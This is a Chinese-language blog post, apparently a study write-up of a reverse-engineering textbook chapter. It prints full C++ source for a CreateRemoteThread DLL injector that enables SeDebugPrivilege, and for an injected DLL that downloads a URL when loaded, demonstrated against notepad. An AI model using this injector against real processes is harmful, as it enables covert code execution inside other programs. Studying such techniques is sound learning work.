@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>关于逆向工程核心原理-DLL注入 - P.Z&#39;s Blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/waline.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/js-cookie@rc/dist/js.cookie.min.js"></script>
+ 
+  
+
+    <script src='//cdn.jsdelivr.net/npm/@waline/client/dist/Waline.min.js'></script>
+
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<!-- //unpkg.com/@waline/client -->
+<!--  -->
+    <body data-color-scheme="auto">
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">P.Z&#39;s Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/Diary/Diary.html">Diary</a>
+            
+            
+            
+            <a class="nav-item" href="/Friends/Friends.html">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/CTF/CTF.html">CTF</a>
+            
+            
+            
+            <a class="nav-item" href="/Book/Book.html">Book</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/PoZeep" target="_blank">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://space.bilibili.com/39892350" target="_blank">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        <article class="post">
+    <div class="meta">
+        
+        <div class="date" id="date">
+            
+            
+            
+            <span>March</span>
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            <span>30,</span>
+            <span>2022</span>
+        </div>
+        
+
+        <h2 class="title">关于逆向工程核心原理-DLL注入</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <p>（简称逆向工程核心原理第二十三章的学习）</p>
+<h1 id="0x00-DLL注入简介"><a href="#0x00-DLL注入简介" class="headerlink" title="0x00 DLL注入简介"></a>0x00 DLL注入简介</h1><p>将DLL强制注入一个进程，就拥有访问目标进程内存的正当的权限X），DLL加载到进程会自动运行DLLMain函数</p>
+<ol>
+<li> 改善功能与修复Bug（类似于插件）</li>
+<li> 消息钩取（Windows默认提供的就是一种DLL技术如SetWindowsHookEx）</li>
+<li> API钩取（开发项目经常使用）</li>
+<li> 监听各种程序（如阻止特定程序 有害网站等）</li>
+<li> 恶意代码（hai客们经常注入到自己制作的恶意代码中）</li>
+</ol>
+<p>DLL注入的实现方法</p>
+<ol>
+<li>  创建远程线程（CreateRemoteThread() API）</li>
+<li>  使用注册表（AppInit_DLLs值）</li>
+<li>  消息勾取（SetWindowsHookEx() API）</li>
+</ol>
+<h1 id="0x01-CreatRemoteThread"><a href="#0x01-CreatRemoteThread" class="headerlink" title="0x01 CreatRemoteThread"></a>0x01 CreatRemoteThread</h1><p>DebugView会输出调试字符串</p>
+<p>再开notepad，用process exploer知道pid</p>
+<p>再用injectDll把myhack注入到notepad的进程里</p>
+<p>于是下过来index.html</p>
+<p>同时可以看到myhack.dll已经注入到notepad里了</p>
+<p><img src="/2022/03/30/%E5%85%B3%E4%BA%8E%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86-DLL%E6%B3%A8%E5%85%A5/image-20220330152438546.png" alt="image-20220330152438546"></p>
+<p>实验很有意思，分析一波源码</p>
+<h2 id="MyHack-dll"><a href="#MyHack-dll" class="headerlink" title="MyHack.dll"></a>MyHack.dll</h2><ol>
+<li> 该dll被加载时会先输出一个调试字符串</li>
+<li> 然后调用线程函数ThreadProc（在这里就会下载文件了）</li>
+</ol>
+<p>这边可以注意下GetModuleFileNameA</p>
+<p>之前用到过是用的NULL，这边上了DLL的基地址，于是是获取DLL文件的路径</p>
+<p>NULL就是获取当前进程可执行文件的路径（之前是KeyHook钩子比较是不是nodepad进程）</p>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulefilenamea">GetModuleFileNameA</a></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="comment">// Unicode编码时，tchar为uchar（双字符）；ANSI编码时，tchar为char</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;UrlMon.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 表示链接urlmon.lib这个库</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;urlmon.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEF_URL     	(<span class="meta-string">L&quot;https://www.ppppz.net/index.html&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEF_FILE_NAME   (<span class="meta-string">L&quot;index.html&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">HMODULE g_hMod = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现下载指定URL内内容</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TCHAR szPath[_MAX_PATH] = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取当前进程已加载模块的文件的完整路径（这边就是把dll的文件所在的路径放到了szPath）</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">GetModuleFileName</span>(g_hMod, szPath, MAX_PATH))</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">   </span><br><span class="line">    <span class="comment">// 查找字符串中某个字符最后一次出现的位置（找到了C:\\LINKSTART\\myhack.dll）</span></span><br><span class="line">    TCHAR* p = _tcsrchr(szPath, <span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!p)</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// _tcscpy_s：字符拷贝函数，若是UNICODE编码则采用wcscpy_s()函数，若是多字节编码则采用strcpy_s()函数</span></span><br><span class="line">    <span class="comment">// 这边就是把C:\\LINKSTART\\myhack.dll换成了C:\\LINKSTART\\index.html</span></span><br><span class="line">    _tcscpy_s(p + <span class="number">1</span>, _MAX_PATH, DEF_FILE_NAME);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从指定URL下载到指定路径</span></span><br><span class="line">    <span class="built_in">URLDownloadToFile</span>(<span class="literal">NULL</span>, DEF_URL, szPath, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 每当dll加载就会加载这个函数</span></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// hinstDLL是DLL的基地址</span></span><br><span class="line">    g_hMod = (HMODULE)hinstDLL;</span><br><span class="line"></span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (fdwReason)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 一加载就是这了</span></span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">            <span class="built_in">OutputDebugString</span>(<span class="string">L&quot;&lt;myhack.dll&gt; Injection!!!&quot;</span>);</span><br><span class="line">            <span class="comment">// 创建一个线程以在调用进程的虚拟地址空间内执行，返回的是新线程的句柄</span></span><br><span class="line">            hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="InjectDLL-cpp"><a href="#InjectDLL-cpp" class="headerlink" title="InjectDLL.cpp"></a>InjectDLL.cpp</h2><h3 id="1-OpenProcess"><a href="#1-OpenProcess" class="headerlink" title="1. OpenProcess"></a>1. OpenProcess</h3><p>使用dwPID获取目标进程（nodepad.exe）句柄</p>
+<p>PROCESS_ALL_ACCESS会有进程对象的所有可能的访问权限 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights">进程安全和访问权限</a></p>
+<p><strong>OpenProcess</strong>打开现有的本地进程（notepad.exe）对象</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !(hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID)) )</span><br><span class="line">&#123;</span><br><span class="line">    _tprintf(<span class="string">L&quot;OpenProcess(%d) failed!!! [%d]\n&quot;</span>, dwPID, <span class="built_in">GetLastError</span>());</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-VirtualAllocEx"><a href="#2-VirtualAllocEx" class="headerlink" title="2. VirtualAllocEx"></a>2. VirtualAllocEx</h3><p>在目标进程hProcess内存中分配dwBufSize大小的内存空间</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pRemoteBuf = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-WriteProcessMemory"><a href="#3-WriteProcessMemory" class="headerlink" title="3. WriteProcessMemory"></a>3. WriteProcessMemory</h3><p>hProcess是要修改的进程内存句柄</p>
+<p>pRemoteBuf是要写入数据进程中的基地址指针（上面通过VirtualAllocEx开了个内存空间）</p>
+<p>szDllPath是指向要写入的指定进程的数据指针（也就是我们的DLL路径）</p>
+<p>简单来说，就是把DLL路径写入目标进程</p>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory#:~:text=WriteProcessMemory%20copies%20the%20data%20from%20the%20specified%20buffer,to%20be%20written%20to%20can%20call%20the%20function.">WriteProcessMemory</a></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="4-GetProcAddress"><a href="#4-GetProcAddress" class="headerlink" title="4. GetProcAddress"></a>4. GetProcAddress</h3><p>先获取模块句柄，再从句柄中获取LoadLibraryW() API的地址</p>
+<p>LoadLibraryW() 是LoadLibrary()的Unicode字符串版本</p>
+<p>Win OS中，kenerl32.dll在每个进程中加载的地址是一样的，<strong>故不用特意在目标进程中获取kenerl32的API</strong>，<strong>直接在原地获取kenerl32中API的地址即可</strong></p>
+<p>简而言之，获取LoadLibraryW() API的地址</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hMod = <span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">pThreadProc = (LPTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(hMod, <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="5-CreateRemoteThread"><a href="#5-CreateRemoteThread" class="headerlink" title="5. CreateRemoteThread"></a>5. CreateRemoteThread</h3><ol>
+<li><p> 令hProcess(notepad.exe)调用CreateRemoThread()从而调用pThreadProc(LoadLibraryW())</p>
+</li>
+<li><p> 参数是pRemoteBuf，也就是VirTualAllocEx创建的空间，被WritreProcessMemory写入的dll路径</p>
+</li>
+<li><p> 从而Notepad进程加载了myhack.dll，一经加载，myhack.dll下载了指定文件</p>
+</li>
+</ol>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, pRemoteBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>现在再来看下dll（0基础WIN32审计起来真带感）</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;tchar.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看设置权限</span></span><br><span class="line"><span class="function">BOOL <span class="title">SetPrivilege</span><span class="params">(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TOKEN_PRIVILEGES tp;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    LUID luid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取进程的Token</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(),</span><br><span class="line">                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, </span><br><span class="line">			              &amp;hToken) )</span><br><span class="line">    &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;OpenProcessToken error: %u\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查看本地系统的权限值</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>,           <span class="comment">// lookup privilege on local system</span></span><br><span class="line">                              lpszPrivilege,  <span class="comment">// privilege to lookup </span></span><br><span class="line">                              &amp;luid) )        <span class="comment">// receives LUID of privilege</span></span><br><span class="line">    &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;LookupPrivilegeValue error: %u\n&quot;</span>, <span class="built_in">GetLastError</span>() ); </span><br><span class="line">        <span class="keyword">return</span> FALSE; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">    <span class="keyword">if</span>( bEnablePrivilege )</span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 启用权限或禁用所有权限</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="built_in">AdjustTokenPrivileges</span>(hToken, </span><br><span class="line">                               FALSE, </span><br><span class="line">                               &amp;tp, </span><br><span class="line">                               <span class="built_in"><span class="keyword">sizeof</span></span>(TOKEN_PRIVILEGES), </span><br><span class="line">                               (PTOKEN_PRIVILEGES) <span class="literal">NULL</span>, </span><br><span class="line">                               (PDWORD) <span class="literal">NULL</span>) )</span><br><span class="line">    &#123; </span><br><span class="line">        _tprintf(<span class="string">L&quot;AdjustTokenPrivileges error: %u\n&quot;</span>, <span class="built_in">GetLastError</span>() ); </span><br><span class="line">        <span class="keyword">return</span> FALSE; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="built_in">GetLastError</span>() == ERROR_NOT_ALL_ASSIGNED )</span><br><span class="line">    &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;The token does not have the specified privilege. \n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现dll注入</span></span><br><span class="line"><span class="function">BOOL <span class="title">InjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hProcess = <span class="literal">NULL</span>, hThread = <span class="literal">NULL</span>;</span><br><span class="line">    HMODULE hMod = <span class="literal">NULL</span>;</span><br><span class="line">    LPVOID pRemoteBuf = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="built_in"><span class="keyword">sizeof</span></span>(TCHAR);</span><br><span class="line">    LPTHREAD_START_ROUTINE pThreadProc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// #1. 使用dwPID获取目标进程（nodepad.exe）句柄</span></span><br><span class="line">    <span class="comment">// PROCESS_ALL_ACCESS会有进程对象的所有可能的访问权限</span></span><br><span class="line">    <span class="keyword">if</span> ( !(hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID)) )</span><br><span class="line">    &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;OpenProcess(%d) failed!!! [%d]\n&quot;</span>, dwPID, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// #2. 在目标进程hProcess内存中分配dwBufSize大小的内存空间</span></span><br><span class="line">    pRemoteBuf = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// #3. 一句话 就是把DLL路径写入目标进程</span></span><br><span class="line">    <span class="comment">// hProcess是要修改的进程内存句柄</span></span><br><span class="line">    <span class="comment">// pRemoteBuf是要写入数据进程中的基地址指针（上面通过VirtualAllocEx开了个内存空间）</span></span><br><span class="line">    <span class="comment">// szDllPath是指向要写入的指定进程的数据指针（也就是我们的DLL路径）</span></span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// #4. 获取LoadLibraryW() API的地址</span></span><br><span class="line">    <span class="comment">// 先获取模块句柄，再从句柄中获取LoadLibraryW() API的地址</span></span><br><span class="line">    <span class="comment">// LoadLibraryW() 是LoadLibrary()的Unicode字符串版本</span></span><br><span class="line">    <span class="comment">// Win OS中，kenerl32.dll在每个进程中加载的地址是一样的，故不用特意在目标进程中获取kenerl32的API，直接在原地获取kenerl32中API的地址即可</span></span><br><span class="line">    hMod = <span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    pThreadProc = (LPTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(hMod, <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// #5. 令hProcess(notepad.exe)调用CreateRemoThread()从而调用pThreadProc(LoadLibraryW())</span></span><br><span class="line">    <span class="comment">// 参数是pRemoteBuf，也就是VirTualAllocEx创建的空间，被WritreProcessMemory写入的dll路径</span></span><br><span class="line">    <span class="comment">// 从而Notepad进程加载了myhack.dll，一经加载，myhack.dll下载了指定文件</span></span><br><span class="line">    hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, pRemoteBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);	</span><br><span class="line"></span><br><span class="line">    <span class="comment">// HAI客完成，下机！</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// _tmain为支持Unicode所使用的main的一个别名，宏定义在tchar.h，经编译为main</span></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, TCHAR *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>( argc != <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;USAGE : %s &lt;pid&gt; &lt;dll_path&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查看设置权限</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="built_in">SetPrivilege</span>(SE_DEBUG_NAME, TRUE) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// inject dll</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="built_in">InjectDll</span>((DWORD)_tstol(argv[<span class="number">1</span>]), argv[<span class="number">2</span>]) )</span><br><span class="line">        _tprintf(<span class="string">L&quot;InjectDll(\&quot;%s\&quot;) success!!!\n&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        _tprintf(<span class="string">L&quot;InjectDll(\&quot;%s\&quot;) failed!!!\n&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>反复编译自己的网站，发现一直不成功，原因是https的关系，于是拿了花雕的网站实验，成了！</p>
+<p>没想到他是网页重定向nnd，换八云虹的了，再一试，成了！</p>
+<p><img src="/2022/03/30/%E5%85%B3%E4%BA%8E%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86-DLL%E6%B3%A8%E5%85%A5/image-20220331160119515.png" alt="image-20220331160119515"></p>
+<h2 id="调试MyHack-dll"><a href="#调试MyHack-dll" class="headerlink" title="调试MyHack.dll"></a>调试MyHack.dll</h2><p>先关于遇到dll就断的选项，attach上nodepad，F9运行下让notepad可以输入</p>
+<p><img src="/2022/03/30/%E5%85%B3%E4%BA%8E%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86-DLL%E6%B3%A8%E5%85%A5/image-20220331160422801.png" alt="image-20220331160422801"></p>
+<p>再开启遇到dll就断，并输入相应的notepad进程号，随后dbg就会断住</p>
+<p><img src="/2022/03/30/%E5%85%B3%E4%BA%8E%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86-DLL%E6%B3%A8%E5%85%A5/image-20220331160646244.png" alt="image-20220331160646244"></p>
+<p>一开始会断在其他dll，因为启动一个就会启动一些其他的依赖balabala</p>
+<p>一直F9，通过这处判断是否到了我们想调试的dll</p>
+<p>现在关于遇到dll就断的选项</p>
+<p><img src="/2022/03/30/%E5%85%B3%E4%BA%8E%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86-DLL%E6%B3%A8%E5%85%A5/image-20220331160814171.png" alt="image-20220331160814171"></p>
